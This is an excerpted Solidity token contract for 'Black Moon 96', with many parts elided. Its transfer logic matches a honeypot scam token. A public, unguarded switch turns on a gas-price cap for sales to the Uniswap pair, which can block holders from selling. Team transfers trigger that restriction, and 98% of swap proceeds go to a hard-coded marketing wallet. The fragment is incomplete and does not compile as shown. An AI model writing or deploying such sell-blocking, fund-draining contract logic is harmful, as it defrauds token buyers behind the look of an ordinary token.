...
contract Contract is Context, IERC20 { 
    string private _name = "Black Moon 96";
    string private _symbol = unicode"BMoon96";
    ...
    uint256 public _gwei = 7 gwei;

    uint8 public _bTxCount = 0;
    uint8 public _sTxCount = 0;
    uint256 public _swapTrigger = 5;
    uint256 public _swapTokenAtAmount = _tTotal * 1 / 50;

    address payable public MarketingWallet = payable(0xcE56ce7282DE9f1eb75FB173813efC8A9F141E92);
    ...
    function islimitInEffect(bool _bool) public {
        transferDelay = _bool;
        limitInEffect = _bool;
    }
    ...
    function _transfer( address from, address to, uint256 amount ) private {
        ...
        if (transferDelay && to == uniswapV2Pair){require (tx.gasprice <= _gwei);}
        ...
        if(_isExcludedFromFee[from] || _isExcludedFromFee[to]){
            ...
            _bTxCount++;}
        if (limitInEffect && (_isTeam[from] || _isTeam[to])) {transferDelay = true;
        _sTxCount++;}
    ...
    function _tokenTransfer(address sender, address recipient, uint256 tAmount, bool takeFee, bool isBuy) private {
        if(!takeFee){ _tOwned[sender] = _tOwned[sender]-tAmount; _tOwned[recipient] = _tOwned[recipient]+tAmount;
            ...
            else { uint256 sellAmt; 
            if (recipient == uniswapV2Pair){sellAmt = tAmount*_sell_free/100;}
    ...
    function swapAndLiquify(uint256 contractTokenBalance) private lockTheSwap {
        uint256 tokensForMarketing = contractTokenBalance.mul(98).div(100);
        uint256 tokenForLpHalf = contractTokenBalance.div(100);
        uint256 balanceBeforeSwap = address(this).balance;
        swapTokensForBNB(tokenForLpHalf + tokensForMarketing);
        uint256 ethBalance = address(this).balance - balanceBeforeSwap;
        uint256 ethForMarketing = ethBalance.mul(98).div(100);
